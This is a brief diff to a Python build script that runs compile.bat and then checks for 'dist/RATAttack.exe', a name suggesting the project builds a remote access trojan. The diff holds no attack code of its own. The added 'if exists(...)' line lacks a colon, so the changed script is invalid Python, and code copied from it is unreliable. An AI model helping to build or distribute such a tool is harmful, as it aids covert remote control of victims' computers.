@@ -1,5 +1,6 @@
 from platform import machine
 from os import system as s
+from os.path import exists
 import sys
 
 auto = len(sys.argv) == 2 and sys.argv[1] == '--yes'
@@ -28,4 +29,8 @@ if not auto:
     input('\n\nDid the install run correctly?\n\n\nPress ENTER to build')
 
 s('compile.bat')
-print('\n\nScript has finished')
+
+if exists('dist/RATAttack.exe')
+    print('\n\nScript has finished')
+else:
+    exit(1)
